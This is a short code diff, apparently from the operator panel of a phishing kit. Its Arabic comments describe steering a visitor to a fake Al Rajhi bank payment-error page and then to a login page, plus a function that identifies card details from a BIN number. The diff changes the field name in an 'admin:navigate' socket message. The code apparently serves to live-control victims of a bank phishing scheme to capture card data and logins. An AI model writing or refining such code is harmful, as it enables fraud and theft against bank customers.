@@ -169,7 +169,7 @@
 
     // دالة تحويل العميل لصفحة خطأ الدفع الراجحي (ثم ينقر متابعة للذهاب لتسجيل الدخول)
     function navigateToRajhi(socketId) {
-      socket.emit('admin:navigate', { socketId, page: 'rajhi-payment-error' });
+      socket.emit('admin:navigate', { visitorSocketId: socketId, page: 'rajhi-payment-error' });
     }
 
     // دالة تحديد معلومات البطاقة من رقم BIN
